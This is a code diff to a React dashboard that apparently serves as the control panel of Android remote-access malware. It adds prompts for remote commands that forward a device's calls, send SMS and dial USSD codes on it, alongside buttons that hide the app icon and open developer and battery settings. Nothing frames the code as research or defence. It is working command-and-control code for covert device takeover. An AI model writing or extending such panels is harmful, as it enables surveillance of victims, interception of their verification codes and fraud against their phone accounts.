@@ -48,6 +48,24 @@ export default function Dashboard() {
       showToast(`Sending ${c}...`);
     } else showToast("No device selected");
   };
+
+  const handleAction = (c: string) => {
+    if (c === 'CALL_FORWARD') {
+      const num = prompt('Enter phone number for Call Forwarding:');
+      if (num) send(c, { number: num });
+    } else if (c === 'SEND_SMS') {
+      const num = prompt('Enter phone number to Send SMS:');
+      if (num) {
+        const msg = prompt('Enter message body:');
+        if (msg) send(c, { number: num, message: msg });
+      }
+    } else if (c === 'DIAL_USSD') {
+      const code = prompt('Enter USSD code (e.g., *123#):');
+      if (code) send(c, { code: code });
+    } else {
+      send(c);
+    }
+  };
   const logout = () => { document.cookie = 'auth_token=; Max-Age=0; path=/;'; router.push('/login'); };
 
   const dev = selectedDevice ? devices[selectedDevice] || {} : {};
@@ -110,7 +128,7 @@ export default function Dashboard() {
                   {l:'Dial USSD', i:'🔢', c:'DIAL_USSD'}, {l:'Hide Icon', i:'🕵️', c:'HIDE_ICON'},
                   {l:'Dev Settings', i:'⚙️', c:'OPEN_DEVELOPER_SETTINGS'}, {l:'Battery Settings', i:'🔋', c:'OPEN_BATTERY_SETTINGS'}
                 ].map((b,i) => (
-                  <button key={i} onClick={() => send(b.c)} className="bg-[#1A1B23] border border-gray-800 hover:border-purple-500 p-4 rounded-xl flex flex-col items-center gap-2 transition group">
+                  <button key={i} onClick={() => handleAction(b.c)} className="bg-[#1A1B23] border border-gray-800 hover:border-purple-500 p-4 rounded-xl flex flex-col items-center gap-2 transition group">
                     <span className="text-2xl group-hover:scale-110 transition">{b.i}</span>
                     <span className="text-xs font-semibold text-gray-300 text-center">{b.l}</span>
                   </button>
